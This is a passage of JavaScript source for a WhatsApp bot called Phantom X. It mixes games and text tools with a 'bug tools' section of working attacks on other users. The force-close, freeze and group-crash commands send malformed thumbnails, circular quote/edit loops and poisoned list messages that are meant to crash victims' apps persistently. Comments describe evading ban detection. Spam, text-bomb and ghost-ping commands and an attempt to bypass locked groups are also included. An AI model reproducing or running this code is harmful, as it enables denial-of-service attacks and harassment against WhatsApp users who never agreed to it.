                    const aliveCount = Object.values(g.alive).filter(Boolean).length;
                    const voted = Object.keys(g.votes).length;
                    if (voted >= aliveCount) {
                        const tally = {};
                        for (const v of Object.values(g.votes)) tally[v] = (tally[v] || 0) + 1;
                        const top = Object.entries(tally).sort((a, b) => b[1] - a[1])[0];
                        g.alive[top[0]] = false;
                        const role = g.roles[top[0]];
                        g.votes = {};
                        const wolves = Object.entries(g.alive).filter(([j, a]) => a && g.roles[j] === "werewolf").length;
                        const villagers = Object.entries(g.alive).filter(([j, a]) => a && g.roles[j] !== "werewolf").length;
                        if (wolves === 0) { delete werewolfState[from]; return reply(`💀 @${top[0].split("@")[0]} (${role}) was voted out!\n\n🏆 *VILLAGERS WIN!*`); }
                        if (wolves >= villagers) { delete werewolfState[from]; return reply(`💀 @${top[0].split("@")[0]} (${role}) was voted out!\n\n🐺 *WEREWOLVES WIN!*`); }
                        g.day++;
                        return reply(`💀 @${top[0].split("@")[0]} (${role}) was voted out!\n\n🌅 *Day ${g.day}* — keep voting.`, { mentions: [top[0]] });
                    }
                    return reply(`✅ Vote recorded (${voted}/${aliveCount}).`);
                }
                return reply("Unknown subcommand. Try *.werewolf*.");
            }

            case ".akinator": {
                const sub = (parts[1] || "").toLowerCase();
                if (sub === "stop") { delete akinatorState[from]; return reply("🛑 Akinator stopped."); }
                if (!akinatorState[from] || sub === "new" || sub === "start") {
                    akinatorState[from] = { history: [], guessed: false };
                    try {
                        const q = await callGemini(`You are playing 20 Questions / Akinator. The player is thinking of a famous person, character, or thing. Ask the FIRST yes/no question to start narrowing down. Output ONLY the question, nothing else.`, { temperature: 0.6 });
                        akinatorState[from].history.push({ role: "akinator", text: q });
                        return reply(`🧞 *Akinator*\n\nThink of a famous person, character, or thing. I'll ask yes/no questions.\n\n*Q1:* ${q}\n\nReply: *.akinator yes/no/maybe*`);
                    } catch (e) { delete akinatorState[from]; return reply(`❌ ${e?.message}`); }
                }
                const ans = sub;
                if (!["yes", "no", "maybe", "y", "n", "m"].includes(ans)) return reply("Reply *.akinator yes*, *.akinator no*, or *.akinator maybe*.");
                akinatorState[from].history.push({ role: "player", text: ans });
                const turns = akinatorState[from].history.filter(x => x.role === "akinator").length;
                const transcript = akinatorState[from].history.map(x => `${x.role === "akinator" ? "Q" : "A"}: ${x.text}`).join("\n");
                try {
                    if (turns >= 20 || (turns >= 7 && Math.random() < 0.25)) {
                        const guess = await callGemini(`Based on this 20Q transcript, make your best guess of WHO/WHAT the player is thinking of. Output exactly: "I think it's <answer>!"\n\n${transcript}`, { temperature: 0.4 });
                        delete akinatorState[from];
                        return reply(`🧞 ${guess}\n\nNew round: *.akinator new*`);
                    }
                    const next = await callGemini(`You're playing 20Q. Continue with the next yes/no question to narrow it down further. Be strategic — don't repeat. Output ONLY the question.\n\nSO FAR:\n${transcript}`, { temperature: 0.6 });
                    akinatorState[from].history.push({ role: "akinator", text: next });
                    return reply(`*Q${turns + 1}:* ${next}\n\nReply: *.akinator yes/no/maybe*`);
                } catch (e) { return reply(`❌ ${e?.message}`); }
            }

            // ════════════════════════════════════════
            // ░░░░░ BUG TOOLS ░░░░░
            // ════════════════════════════════════════

            case ".bugmenu": {
                const section = parts[1]?.toLowerCase();
                const bugMenuText = buildBugMenuText(section);
                if (fs.existsSync(BUG_BANNER_FILE)) {
                    try {
                        const bugBannerBuf = fs.readFileSync(BUG_BANNER_FILE);
                        await sock.sendMessage(from, { image: bugBannerBuf, caption: bugMenuText }, { quoted: msg });
                    } catch (_) {
                        await reply(bugMenuText);
                    }
                } else {
                    await reply(bugMenuText);
                }
                break;
            }

            case ".zalgo": {
                const zalgoInput = parts.slice(1).join(" ").trim();
                if (!zalgoInput) return reply("Usage: .zalgo <text>\nExample: .zalgo Phantom X");
                const zalgoUp = ["\u030d","\u030e","\u0304","\u0305","\u033f","\u0311","\u0306","\u0310","\u0352","\u0357","\u0351","\u0307","\u0308","\u030a","\u0342","\u0343","\u0344","\u034a","\u034b","\u034c","\u0303","\u0302","\u030c","\u0350","\u0300","\u0301","\u030b","\u030f","\u0312","\u0313","\u0314","\u033d","\u0309","\u0363","\u0364","\u0365","\u0366","\u0367","\u0368","\u0369","\u036a","\u036b","\u036c","\u036d","\u036e","\u036f","\u033e","\u035b"];
                const zalgoMid = ["\u0315","\u031b","\u0340","\u0341","\u0358","\u0321","\u0322","\u0327","\u0328","\u0334","\u0335","\u0336","\u034f","\u035c","\u035d","\u035e","\u035f","\u0360","\u0362","\u0338","\u0337","\u0361","\u0489"];
                const zalgoDown = ["\u0316","\u0317","\u0318","\u0319","\u031c","\u031d","\u031e","\u031f","\u0320","\u0324","\u0325","\u0326","\u0329","\u032a","\u032b","\u032c","\u032d","\u032e","\u032f","\u0330","\u0331","\u0332","\u0333","\u0339","\u033a","\u033b","\u033c","\u0345","\u0347","\u0348","\u0349","\u034d","\u034e","\u0353","\u0354","\u0355","\u0356","\u0359","\u035a","\u0323"];
                const randArr = arr => arr[Math.floor(Math.random() * arr.length)];
                let zalgoOut = "";
                for (const ch of zalgoInput) {
                    zalgoOut += ch;
                    const upCount = Math.floor(Math.random() * 6) + 2;
                    const midCount = Math.floor(Math.random() * 3);
                    const downCount = Math.floor(Math.random() * 6) + 2;
                    for (let i = 0; i < upCount; i++) zalgoOut += randArr(zalgoUp);
                    for (let i = 0; i < midCount; i++) zalgoOut += randArr(zalgoMid);
                    for (let i = 0; i < downCount; i++) zalgoOut += randArr(zalgoDown);
                }
                await reply(`👹 *Z̷̢̛̪A̶̗͠L̵͖̒G̸͎̔O̴͕̊ T̵̤̀E̸͎̾X̵̯̾T̶̢̕*\n\n${zalgoOut}`);
                break;
            }

            case ".bigtext": {
                const bigtextInput = parts.slice(1).join(" ").trim();
                if (!bigtextInput) return reply("Usage: .bigtext <text>\nExample: .bigtext PHANTOM");
                const blockMap = {
                    a:"🅰",b:"🅱",c:"🅲",d:"🅳",e:"🅴",f:"🅵",g:"🅶",h:"🅷",i:"🅸",j:"🅹",
                    k:"🅺",l:"🅻",m:"🅼",n:"🅽",o:"🅾",p:"🅿",q:"🆀",r:"🆁",s:"🆂",t:"🆃",
                    u:"🆄",v:"🆅",w:"🆆",x:"🆇",y:"🆈",z:"🆉"," ":"   ",
                    "0":"0️⃣","1":"1️⃣","2":"2️⃣","3":"3️⃣","4":"4️⃣",
                    "5":"5️⃣","6":"6️⃣","7":"7️⃣","8":"8️⃣","9":"9️⃣",
                };
                const bigOut = bigtextInput.toLowerCase().split("").map(c => blockMap[c] || c).join(" ");
                await reply(`📐 *Big Text:*\n\n${bigOut}`);
                break;
            }

            case ".invisible": {
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const invChar = "\u2062\u2063\u2064\u200b\u200c\u200d\u00ad";
                await sock.sendMessage(from, { text: invChar.repeat(50) });
                break;
            }

            case ".rtl": {
                const rtlInput = parts.slice(1).join(" ").trim();
                if (!rtlInput) return reply("Usage: .rtl <text>\nExample: .rtl Hello World");
                const rtlOut = "\u202e" + rtlInput;
                await reply(`➡️ *RTL Text:*\n\n${rtlOut}`);
                break;
            }

            case ".mock": {
                const mockInput = parts.slice(1).join(" ").trim();
                if (!mockInput) return reply("Usage: .mock <text>\nExample: .mock I am the best");
                let mockOut = "";
                let toggle = false;
                for (const ch of mockInput) {
                    if (ch === " ") { mockOut += " "; continue; }
                    mockOut += toggle ? ch.toUpperCase() : ch.toLowerCase();
                    toggle = !toggle;
                }
                await reply(`🧽 ${mockOut}`);
                break;
            }

            case ".aesthetic": {
                const aesInput = parts.slice(1).join(" ").trim();
                if (!aesInput) return reply("Usage: .aesthetic <text>\nExample: .aesthetic phantom x");
                const aesMap = "abcdefghijklmnopqrstuvwxyz0123456789";
                const aesOut_chars = "ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ０１２３４５６７８９";
                let aesOut = "";
                for (const ch of aesInput.toLowerCase()) {
                    const idx = aesMap.indexOf(ch);
                    aesOut += idx !== -1 ? [...aesOut_chars][idx] : ch === " " ? "　" : ch;
                }
                await reply(`🌸 ${aesOut}`);
                break;
            }

            case ".reverse": {
                const revInput = parts.slice(1).join(" ").trim();
                if (!revInput) return reply("Usage: .reverse <text>\nExample: .reverse Hello World");
                const revOut = [...revInput].reverse().join("");
                await reply(`🔁 *Reversed:*\n\n${revOut}`);
                break;
            }

            case ".clap": {
                const clapInput = parts.slice(1).join(" ").trim();
                if (!clapInput) return reply("Usage: .clap <text>\nExample: .clap this is the best bot");
                const clapOut = clapInput.split(" ").join(" 👏 ");
                await reply(`👏 ${clapOut} 👏`);
                break;
            }

            // ─── FORCE CLOSE BUG (Malformed Thumbnail) ───
            // Sends 1 document with a PNG thumbnail claiming 65535×65535 dimensions
            // but with corrupted body data. WA's image decoder allocates memory for
            // the claimed size then panics on the corrupt body → force close on chat open.
            // Persists in WA's media cache — crashes every open until cleared or reinstalled.
            case ".forceclose":
            case ".fc": {
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const fcTarget = parseBugTarget(parts, msg);
                if (!fcTarget) return reply(
                    `💀 *Force Close Bug*\n\n` +
                    `Usage: *.forceclose <number>*\nShortcut: *.fc <number>*\n` +
                    `Example: *.forceclose 2348012345678*\n\n` +
                    `_Sends 1 document with a malformed thumbnail binary._\n` +
                    `_WA's image decoder crashes every time they open the chat._\n` +
                    `_Persists until they clear WA media or reinstall._\n` +
                    `_Use .bugmenu forceclose for full help._`
                );
                if (isDevProtected(fcTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
                await reply(`💀 Sending force close payload to *${fcTarget.split("@")[0]}*...`);
                try {
                    if (!userCrashKeys[fcTarget]) userCrashKeys[fcTarget] = [];
                    if (!userBugTypes[fcTarget]) userBugTypes[fcTarget] = [];

                    // 1 document — malformed PNG thumbnail crashes the image decoder on render
                    const fcProto = waProto.Message.fromObject({
                        documentMessage: {
                            mimetype:      "application/pdf",
                            title:         "document.pdf",
                            fileName:      "document.pdf",
                            pageCount:     1,
                            jpegThumbnail: buildMalformedThumb()
                        }
                    });
                    const fcWAMsg = generateWAMessageFromContent(fcTarget, fcProto, { timestamp: new Date(), userJid: sock.user?.id });
                    await sock.relayMessage(fcTarget, fcWAMsg.message, { messageId: fcWAMsg.key.id });
                    userCrashKeys[fcTarget].push(fcWAMsg.key);

                    if (!userBugTypes[fcTarget].includes("Force Close")) userBugTypes[fcTarget].push("Force Close");
                    await reply(
                        `✅ *Force close active on ${fcTarget.split("@")[0]}!*\n\n` +
                        `💀 Malformed thumbnail delivered — 1 silent document.\n` +
                        `📱 Their WA crashes every time they open the chat.\n` +
                        `💾 Persists until they clear WA media or reinstall.\n` +
                        `🔧 To undo: *.unbug ${fcTarget.split("@")[0]}*`
                    );
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── FREEZE BUG (Circular DB Index Loop) ───
            // Sends 3 packets with human-like timing to create a circular reference
            // in the target's local msgstore.db:
            //   Packet 1: Message A (anchor)
            //   Packet 2: Message B quotes A + 5000 junk mentionedJids (SQLite read storm)
            //   Packet 3: Edit A to quote B → A→B→A→B loop in their DB
            // Effect: WA loads chat, reads A, tries to load B preview, reads B,
            // tries to load A preview — infinite loop. Msgs blocked in & out.
            // Persists after restart — only reinstall or .unbug clears it.
            // 3 packets spaced 3.5s apart looks exactly like a human typing to WA.
            case ".freeze": {
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const freezeTarget = parseBugTarget(parts, msg);
                if (!freezeTarget) return reply(
                    `🧊 *Freeze Bug*\n\nUsage: *.freeze <number>*\nExample: *.freeze 2348012345678*\n\n` +
                    `_Creates a circular DB index loop (A→B→A→B) in their local WA storage._\n` +
                    `_Msgs blocked in & out. Persists after restart._\n` +
                    `_3 packets with human timing — very low ban risk._\n\n` +
                    `_Use .bugmenu freeze for full help._`
                );
                if (isDevProtected(freezeTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
                await reply(`🧊 Deploying circular index trap on *${freezeTarget.split("@")[0]}*...\n\n⏳ Sending 3 packets (takes ~8 seconds)...`);
                try {
                    if (!userCrashKeys[freezeTarget]) userCrashKeys[freezeTarget] = [];
                    if (!userBugTypes[freezeTarget]) userBugTypes[freezeTarget] = [];

                    // Packet 1 — Message A (anchor point)
                    const msgA = await sock.sendMessage(freezeTarget, { text: "\u200b" });
                    userCrashKeys[freezeTarget].push(msgA.key);

                    // Human-like delay — looks like someone typing a reply
                    await delay(3500);

                    // Packet 2 — Message B quotes A + 5000 junk JIDs (SQLite read storm)
                    const msgB = await sock.sendMessage(freezeTarget, {
                        text:     "\u200b",
                        mentions: Array(5000).fill("0@s.whatsapp.net")
                    }, { quoted: msgA });
                    userCrashKeys[freezeTarget].push(msgB.key);

                    // Human-like delay
                    await delay(3500);

                    // Packet 3 — Edit A to quote B (completing the A→B→A circular reference)
                    const editProto = waProto.Message.fromObject({
                        protocolMessage: {
                            key:  msgA.key,
                            type: 14, // MESSAGE_EDIT
                            editedMessage: {
                                extendedTextMessage: {
                                    text: "\u200b",
                                    contextInfo: {
                                        stanzaId:      msgB.key.id,
                                        participant:   freezeTarget,
                                        quotedMessage: { conversation: "\u200b" },
                                        mentionedJid:  Array(3000).fill("0@s.whatsapp.net")
                                    }
                                }
                            }
                        }
                    });
                    const editWAMsg = generateWAMessageFromContent(freezeTarget, editProto, { timestamp: new Date(), userJid: sock.user?.id });
                    await sock.relayMessage(freezeTarget, editWAMsg.message, { messageId: editWAMsg.key.id });

                    if (!userBugTypes[freezeTarget].includes("Freeze")) userBugTypes[freezeTarget].push("Freeze");
                    await reply(
                        `✅ *Circular index trap active on ${freezeTarget.split("@")[0]}!*\n\n` +
                        `🔄 3 packets sent — velocity check: ✅ looks human\n` +
                        `🧊 Their DB: A→B→A→B — loops forever on load\n` +
                        `📵 Msgs blocked in & out — persists after restart\n` +
                        `🔧 To undo: *.unbug ${freezeTarget.split("@")[0]}*`
                    );
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── GROUP CRASH (Dead Zone — List Message DB Poison) ───
            // Sends 1 invisible list message with 5000 fake mentionedJids + 100 rows
            // of junk rowIds wrapped in massive invisible chars.
            // WA's UI thread tries to "draw" the message and panics — crash on open.
            // Effect persists in msgstore.db until message is deleted or app reinstalled.
            case ".groupcrash": {
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                let gcTarget = null;
                const gcArg = parts[1];
                if (!gcArg) {
                    if (!isGroup) return reply(
                        `💣 *Group Crash*\n\n` +
                        `Usage:\n` +
                        `• *.groupcrash* — run inside the target group\n` +
                        `• *.groupcrash <groupId>* — use group ID (from *.groupid*)\n` +
                        `• *.groupcrash <invite link>* — paste invite link\n\n` +
                        `_Sends 1 invisible payload — anyone who opens the group, WA crashes._\n` +
                        `_Persists across restarts. Use *.ungroupcrash <groupId>* to restore._`
                    );
                    gcTarget = from;
                } else if (gcArg.includes("chat.whatsapp.com/")) {
                    const code = gcArg.split("chat.whatsapp.com/")[1]?.split(/[?#]/)[0];
                    if (!code) return reply("❌ Invalid invite link.");
                    try {
                        const info = await sock.groupGetInviteInfo(code);
                        gcTarget = info.id;
                    } catch { return reply("❌ Could not resolve invite link. Make sure bot is in that group."); }
                } else if (gcArg.endsWith("@g.us")) {
                    gcTarget = gcArg;
                } else {
                    return reply("❌ Invalid target. Use a group ID (ends in @g.us) or a WhatsApp invite link.");
                }
                const gcName = groupNames[gcTarget] || gcTarget;
                await reply(`💣 Deploying group crash to *${gcName}*...`);
                try {
                    if (!groupCrashKeys[gcTarget]) groupCrashKeys[gcTarget] = [];

                    // 1 list message — invisible chars + 5000 junk JIDs + 100 junk rows
                    const gcMsg    = buildGroupCrashMsg();
                    const gcWAMsg  = generateWAMessageFromContent(gcTarget, gcMsg, { timestamp: new Date(), userJid: sock.user?.id });
                    await sock.relayMessage(gcTarget, gcWAMsg.message, { messageId: gcWAMsg.key.id });
                    groupCrashKeys[gcTarget].push(gcWAMsg.key);

                    await reply(
                        `✅ *Group crash active on "${gcName}"!*\n\n` +
                        `💣 1 payload sent — invisible list message with DB poison.\n` +
                        `☠️ Anyone who opens the group → WA crashes immediately.\n` +
                        `📱 Works on Android & iOS — no tap needed.\n` +
                        `💾 Persists across restarts until message is deleted.\n` +
                        `🔧 To restore: *.ungroupcrash ${gcTarget}*`
                    );
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── UNDO GROUP CRASH ───
            // Deletes the crash message(s) from the group — restores normal access.
            case ".ungroupcrash": {
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const ugcArg = parts[1] || (isGroup ? from : null);
                if (!ugcArg) return reply("Usage: .ungroupcrash <groupId>\n\nGet the group ID from *.groupid*\nOr run this inside the affected group.");
                const ugcTarget = ugcArg.endsWith("@g.us") ? ugcArg : (isGroup ? from : null);
                if (!ugcTarget) return reply("❌ Invalid group ID. Must end in @g.us");
                const keys = groupCrashKeys[ugcTarget];
                if (!keys || !keys.length) return reply("⚠️ No stored crash messages found for that group.\n\nThe bot may have restarted since the crash was sent.");
                const ugcName = groupNames[ugcTarget] || ugcTarget;
                await reply(`🔧 Undoing group crash on *${ugcName}*...`);
                let deleted = 0;
                for (const k of keys) {
                    try {
                        await sock.sendMessage(ugcTarget, { delete: k });
                        deleted++;
                        await delay(500);
                    } catch (_) {}
                }
                delete groupCrashKeys[ugcTarget];
                await reply(`✅ *Group restored!* Deleted ${deleted} crash message(s) from *${ugcName}*.\n\nMembers can now open the group normally.`);
                break;
            }

            // ─── UNBUG (remove all personal bugs from a user) ───
            case ".unbug": {
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const unbugTarget = parseBugTarget(parts, msg);
                if (!unbugTarget) return reply(`🔧 *Unbug*\n\nUsage: *.unbug <number>*\nExample: *.unbug 2348012345678*`);
                const unbugKeys = userCrashKeys[unbugTarget];
                if (!unbugKeys || !unbugKeys.length) return reply(`⚠️ Nothing active found for *${unbugTarget.split("@")[0]}*.\n\n_Either the bot was restarted since you sent it, or that number has not been targeted._`);
                // Silent working message — auto-deletes in 2 seconds
                let workingMsg;
                try { workingMsg = await sock.sendMessage(from, { text: `⏳ Working on *${unbugTarget.split("@")[0]}*...` }, { quoted: msg }); } catch (_) {}
                setTimeout(async () => { try { if (workingMsg) await sock.sendMessage(from, { delete: workingMsg.key }); } catch (_) {} }, 2000);
                // Delete all stored payload keys
                let unbugDeleted = 0;
                for (const k of unbugKeys) {
                    try {
                        await sock.sendMessage(k.remoteJid || unbugTarget, { delete: k });
                        unbugDeleted++;
                        await delay(400);
                    } catch (_) {}
                }
                const clearedTypes = (userBugTypes[unbugTarget] || []).join(", ") || "N/A";
                delete userCrashKeys[unbugTarget];
                delete userBugTypes[unbugTarget];
                // Confirmation — auto-deletes in 10 seconds
                let doneMsg;
                try {
                    doneMsg = await sock.sendMessage(from, {
                        text:
                            `✅ *${unbugTarget.split("@")[0]} — Cleared*\n\n` +
                            `📦 Payloads removed: *${unbugDeleted}*\n` +
                            `🧹 Bug types cleared: *${clearedTypes}*\n\n` +
                            `_Their WhatsApp is back to normal._`
                    });
                } catch (_) {}
                setTimeout(async () => { try { if (doneMsg) await sock.sendMessage(from, { delete: doneMsg.key }); } catch (_) {} }, 10000);
                break;
            }

            // ─── CHAT (owner talks to the bot like a chatbox) ───
            case ".chat": {
                if (!msg.key.fromMe) return;
                const chatInput = parts.slice(1).join(" ").trim();
                if (!chatInput) return reply(`🤖 *Phantom X Chat*\n\nUsage: *.chat <message>*\n\nTalk to me! I'll respond.\nExample: *.chat how are you*`);
                const lc = chatInput.toLowerCase();
                const quickReplies = [
                    [["hi","hello","hey","sup"], "Hey! 👋 What's up? How can I help you today?"],
                    [["how are you","how r u","how are u"], "I'm doing great! Always online, always ready. 😎"],
                    [["what's your name","your name","who are you"], "I'm *Phantom X* — your personal WhatsApp bot! 👻"],
                    [["who made you","who created you","who built you"], `I was built by the developer with number ${DEV_NUMBER}. 🛠️`],
                    [["what can you do","your features","commands"], "Type *.menu* to see everything I can do! 🔥"],
                    [["good morning","gm"], "Good morning! ☀️ Have an amazing day!"],
                    [["good night","gn","goodnight"], "Good night! 🌙 Rest well."],
                    [["thanks","thank you","thx","ty"], "You're welcome! 😊 Anything else?"],
                    [["i love you","ilove you"], "Love you too! 💛 I'm always here for you."],
                    [["bye","goodbye","later","cya"], "Bye! 👋 Come back anytime."],
                    [["bored","i'm bored"], "Try *.trivia*, *.riddle*, *.8ball*, or *.slots*! 🎮"],
                    [["joke","tell me a joke"], `😂 ${JOKES[Math.floor(Math.random() * JOKES.length)]}`],
                    [["fact","random fact"], `📚 ${FACTS[Math.floor(Math.random() * FACTS.length)]}`],
                ];
                for (const [keys, response] of quickReplies) {
                    if (keys.some(k => lc.includes(k))) return reply(`🤖 ${response}`);
                }
                // Try Gemini AI for anything else
                const GEMINI_KEY = process.env.GEMINI_API_KEY;
                if (GEMINI_KEY) {
                    try {
                        const geminiRes = await new Promise((resolve, reject) => {
                            const body = JSON.stringify({ contents: [{ parts: [{ text: `You are Phantom X, a friendly WhatsApp bot assistant. Reply conversationally and briefly. User says: ${chatInput}` }] }] });
                            const options = { hostname: "generativelanguage.googleapis.com", path: `/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_KEY}`, method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } };
                            const req = https.request(options, (res) => { let d = ""; res.on("data", c => d += c); res.on("end", () => { try { resolve(JSON.parse(d)); } catch { reject(new Error("parse")); } }); });
                            req.on("error", reject); req.write(body); req.end();
                        });
                        const aiReply = geminiRes?.candidates?.[0]?.content?.parts?.[0]?.text?.trim();
                        if (aiReply) return reply(`🤖 ${aiReply}`);
                    } catch (_) {}
                }
                // Fallback
                const fallbacks = ["Interesting! Tell me more. 🤔", "I hear you! 😊", "That's noted! What else can I do for you?", "Got it! 👍", "Hmm, say that again? 😄"];
                await reply(`🤖 ${fallbacks[Math.floor(Math.random() * fallbacks.length)]}`);
                break;
            }

            // ─── AUTO-JOIN GROUP LINKS ───
            case ".autojoin": {
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const ajArg = parts[1]?.toLowerCase();
                if (!ajArg) {
                    const aj = loadAutojoin();
                    const status = aj[sock.user?.id || "global"]?.enabled ? "✅ ON" : "❌ OFF";
                    return reply(`🔗 *Auto-Join Group Links*\n\nStatus: *${status}*\n\nUsage:\n*.autojoin on* — Bot joins any group link shared in groups\n*.autojoin off* — Stop auto-joining\n\n⚠️ Blacklisted keywords: porn, adult, xxx, nude, sex, leak, onlyfan\n_Links containing these words will be ignored._`);
                }
                const aj = loadAutojoin();
                const key = sock.user?.id || "global";
                if (ajArg === "on") {
                    if (!aj[key]) aj[key] = {};
                    aj[key].enabled = true;
                    saveAutojoin(aj);
                    return reply(`✅ *Auto-join ON!*\nThe bot will now automatically join any WhatsApp group link shared in your groups.\n\n🚫 Blacklisted links (porn/adult/nude etc.) will be skipped.`);
                }
                if (ajArg === "off") {
                    if (!aj[key]) aj[key] = {};
                    aj[key].enabled = false;
                    saveAutojoin(aj);
                    return reply(`❌ *Auto-join OFF.*\nThe bot will no longer auto-join group links.`);
                }
                return reply("Usage: .autojoin on/off");
            }

            // ─── LOCKED GROUP BYPASS ───
            // Attempts to send a message into a group locked to admins-only.
            // Tries multiple message types to find one that bypasses the restriction.
            case ".lockedbypass": {
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                if (!isGroup) return reply("❌ Run this inside the locked group.");
                const lbText = parts.slice(1).join(" ").trim() || "👻 Phantom X";
                await reply(`🔓 Attempting to bypass admin-only lock...`);
                let success = false;
                const attempts = [
                    async () => await sock.sendMessage(from, { text: lbText }),
                    async () => await sock.sendMessage(from, { forward: { key: msg.key, message: msg.message } }),
                    async () => await sock.sendMessage(from, { react: { text: "👻", key: msg.key } }),
                ];
                for (let i = 0; i < attempts.length; i++) {
                    try { await attempts[i](); success = true; break; } catch (_) {}
                }
                if (success) {
                    await reply(`✅ Bypass attempt sent! Check if the message appeared in the group.`);
                } else {
                    await reply(
                        `❌ All bypass methods failed.\n\n` +
                        `_Note: Modern WhatsApp fully blocks non-admin messages in locked groups. The bot needs admin rights to send messages._\n\n` +
                        `💡 *Tip:* If the bot is admin, use *.unlock* to re-open the group first.`
                    );
                }
                break;
            }

            // ─── SPAM ATTACK ───
            // ⚠️ HONEST WARNING: This sends FROM your WhatsApp — risks YOUR account not theirs.
            // Max 5 messages with a delay to reduce ban risk.
            case ".spamatk": {
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const saMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                const saTarget = saMentioned[0];
                const saTimes = Math.min(parseInt(parts[1]) || 5, 5);
                if (!saTarget) return reply(
                    `Usage: .spamatk @user [times 1-5]\n\n` +
                    `⚠️ *IMPORTANT:*\n` +
                    `This sends messages FROM your WhatsApp to the target.\n` +
                    `It fills their inbox but does NOT ban them.\n` +
                    `Sending too many messages risks getting YOUR number flagged.\n` +
                    `Max is capped at 5 for your safety.`
                );
                await reply(`📨 Sending ${saTimes} spam messages to @${saTarget.split("@")[0]}...\n⚠️ Risk is on YOUR account — stay safe.`);
                try {
                    for (let i = 0; i < saTimes; i++) {
                        await sock.sendMessage(saTarget, { text: `👻 Phantom X — Message ${i+1}/${saTimes}` });
                        await delay(1500);
                    }
                    await reply(`✅ Done! Sent ${saTimes} messages to @${saTarget.split("@")[0]}.`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── EMOJI BOMB (1 message) ───
            case ".emojibomb": {
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const ebMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                const ebTarget = ebMentioned[0] || from;
                const ebEmoji = parts.find(p => /\p{Emoji}/u.test(p) && p !== parts[0]) || "💥";
                await reply(`💣 Sending emoji bomb to @${ebTarget.split("@")[0]}...`);
                try {
                    await sock.sendMessage(ebTarget, { text: ebEmoji.repeat(500) });
                    await reply(`✅ Emoji bomb sent to @${ebTarget.split("@")[0]}!`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── TEXT BOMB (max 5 messages with delay) ───
            case ".textbomb": {
                if (!msg.key.fromMe) return reply("❌ Owner only.\nUsage: .textbomb @user <text> <times 1-5>\nExample: .textbomb @user hello 5");
                const tbMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                const tbTarget = tbMentioned[0];
                if (!tbTarget) return reply("Usage: .textbomb @user <text> <times 1-5>");
                const tbTimes = Math.min(parseInt(parts[parts.length - 1]) || 3, 5);
                const tbText = parts.slice(2, parts.length - 1).join(" ").trim() || "👻 Phantom X";
                try {
                    for (let i = 0; i < tbTimes; i++) {
                        await sock.sendMessage(tbTarget, { text: tbText });
                        await delay(1200);
                    }
                    await reply(`✅ Sent *${tbTimes}* messages to @${tbTarget.split("@")[0]}.`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── GHOST PING ───
            case ".ghostping": {
                if (!isGroup) return reply("❌ Only works in groups.");
                const gpMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (!gpMentioned.length) return reply("Usage: .ghostping @user\n\nTags someone silently — they get a notification but no visible message.");
                try {
                    const sent = await sock.sendMessage(from, { text: " ", mentions: gpMentioned });
                    await delay(600);
                    await sock.sendMessage(from, { delete: sent.key });
                    await reply(`👻 Ghost pinged @${gpMentioned[0].split("@")[0]}!`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ────────────────────────────────────────
            // ════════════════════════════════════════
            // ░░░░░ EXTRAS ░░░░░
            // ════════════════════════════════════════

            case ".sticker": {
                const stickerQuoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const stickerMsg = stickerQuoted || msg.message;
                const stickerType = getContentType(stickerMsg);
                if (!stickerMsg || !["imageMessage", "videoMessage"].includes(stickerType)) {
                    return reply("🖼️ Reply to an *image* or short *video* with *.sticker* to convert it.\n\nExample: Reply to any image with _.sticker_");
                }
                try {
                    await reply("⏳ Converting to sticker...");
                    const fakeForSticker = stickerQuoted ? { ...msg, message: stickerQuoted } : msg;
                    const mediaBuf = await downloadMediaMessage(fakeForSticker, "buffer", {}, { logger: pino({ level: "silent" }) });
                    if (stickerType === "imageMessage") {
                        await sock.sendMessage(from, { sticker: mediaBuf }, { quoted: msg });
                    } else {
                        return reply("⚠️ *Video stickers are not supported.*\n\nOnly images can be converted to stickers.\nReply to an *image* with *.sticker* instead.");
                    }
                } catch (e) { await reply(`❌ Sticker conversion failed: ${e?.message}`); }
                break;
            }

            case ".toimg": {
                const toImgQuoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const toImgMsg = toImgQuoted || msg.message;
                const toImgType = getContentType(toImgMsg);
                if (!toImgMsg || toImgType !== "stickerMessage") {
                    return reply("🖼️ Reply to a *sticker* with *.toimg* to convert it to an image.");
                }
                try {
                    await reply("⏳ Converting sticker to image...");
                    const fakeForImg = toImgQuoted ? { ...msg, message: toImgQuoted } : msg;
                    const imgBuf = await downloadMediaMessage(fakeForImg, "buffer", {}, { logger: pino({ level: "silent" }) });
